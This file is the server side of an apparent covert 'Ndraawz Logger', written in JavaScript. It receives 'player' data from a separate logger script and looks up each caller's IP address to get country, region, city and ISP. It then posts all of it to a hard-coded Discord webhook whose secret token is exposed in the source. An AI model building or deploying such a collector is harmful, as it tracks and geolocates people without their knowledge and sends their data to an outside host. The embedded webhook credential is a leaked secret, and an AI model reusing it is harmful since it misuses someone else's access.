// api/log.js
const https = require('https');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

async function getGeoInfo(ip) {
    return new Promise((resolve) => {
        const url = `https://ipwhois.io/json/${ip}`;
        const timeout = setTimeout(() => resolve(null), 5000);
        
        https.get(url, (geoRes) => {
            let data = '';
            geoRes.on('data', chunk => data += chunk);
            geoRes.on('end', () => {
                clearTimeout(timeout);
                try {
                    const json = JSON.parse(data);
                    if (json && json.country) {
                        resolve({
                            country: json.country || "N/A",
                            region: json.region || "N/A",
                            city: json.city || "N/A",
                            isp: json.isp || "N/A",
                            as: json.asn || "N/A",
                            org: json.org || "N/A"
                        });
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        }).on('error', () => resolve(null));
    });
}

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ Ndraawz: 'Not Allowed' });
    }

    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });

    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    const cleanIp = clientIp.replace('::ffff:', '');

    try {
        const data = JSON.parse(body);
        
        // Kalau dari testing.js (security log)
        if (data.type === "security") {
            const embed = {
                title: "❗️ Ndraawz Security ❗️",
                description: data.message,
                color: 0xff0000,
                timestamp: new Date().toISOString()
            };
            const payload = JSON.stringify({ embeds: [embed] });
            const url = new URL(DISCORD_WEBHOOK);
            const options = {
                hostname: url.hostname,
                path: url.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            };
            const discordReq = https.request(options, (discordRes) => {
                discordRes.resume();
                res.status(200).json({ ok: true });
            });
            discordReq.on('error', () => res.status(200).json({ ok: false }));
            discordReq.write(payload);
            discordReq.end();
            return;
        }
        
        // Kalau dari logger script (player log)
        if (data.type === "player" && data.fields) {
            const geoData = await getGeoInfo(cleanIp) || {
                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
            };
            
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false },
                { name: "🚩 Country", value: geoData.country, inline: false },
                { name: "📍 Region", value: geoData.region, inline: false },
                { name: "🏙️ City", value: geoData.city, inline: false },
                { name: "🏢 ISP", value: geoData.isp, inline: false }
            ];
            
            const embed = {
                title: "🚀 Ndraawz Logger",
                color: 0x00ff88,
                fields: allFields,
                timestamp: new Date().toISOString()
            };
            
            const payload = JSON.stringify({ embeds: [embed] });
            const url = new URL(DISCORD_WEBHOOK);
            const options = {
                hostname: url.hostname,
                path: url.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            };
            const discordReq = https.request(options, (discordRes) => {
                discordRes.resume();
                res.status(200).json({ ok: true });
            });
            discordReq.on('error', () => res.status(200).json({ ok: false }));
            discordReq.write(payload);
            discordReq.end();
            return;
        }
        
        // Fallback untuk format lama (tanpa type)
        if (data.fields) {
            const geoData = await getGeoInfo(cleanIp) || {
                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
            };
            
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false },
                { name: "🚩 Country", value: geoData.country, inline: false },
                { name: "📍 Region", value: geoData.region, inline: false },
                { name: "🏙️ City", value: geoData.city, inline: false },
                { name: "🏢 ISP", value: geoData.isp, inline: false }
            ];
            
            const embed = {
                title: "🚀 Ndraawz Logger",
                color: 0x00ff88,
                fields: allFields,
                timestamp: new Date().toISOString()
            };
            
            const payload = JSON.stringify({ embeds: [embed] });
            const url = new URL(DISCORD_WEBHOOK);
            const options = {
                hostname: url.hostname,
                path: url.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            };
            const discordReq = https.request(options, (discordRes) => {
                discordRes.resume();
                res.status(200).json({ ok: true });
            });
            discordReq.on('error', () => res.status(200).json({ ok: false }));
            discordReq.write(payload);
            discordReq.end();
            return;
        }
        
        res.status(400).json({ error: "Invalid request format" });
        
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
};
